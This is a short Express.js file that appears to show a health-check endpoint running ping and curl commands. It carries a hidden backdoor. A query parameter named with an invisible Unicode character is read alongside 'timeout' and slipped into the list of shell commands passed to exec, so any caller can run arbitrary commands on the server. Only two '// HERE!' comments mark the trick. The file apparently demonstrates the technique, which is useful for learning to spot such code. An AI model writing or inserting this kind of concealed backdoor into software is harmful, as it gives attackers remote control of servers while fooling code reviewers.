const util = require('util');
const exec = util.promisify(require('child_process').exec);

const app = express();

app.get('/network_health', async (req, res) => {
    const { timeout,ㅤ} = req.query; // HERE!
    const checkCommands = [
        'ping -c 1 google.com',
        'curl -s http://example.com/',ㅤ // HERE!
    ];

    try {
        await Promise.all(checkCommands.map(cmd =>
            cmd && exec(cmd, { timeout: +timeout || 5_000 })));
        res.status(200);
        res.send('ok');
    } catch(e) {
        res.status(500);
        res.send('failed');
    }
});

app.listen(8080);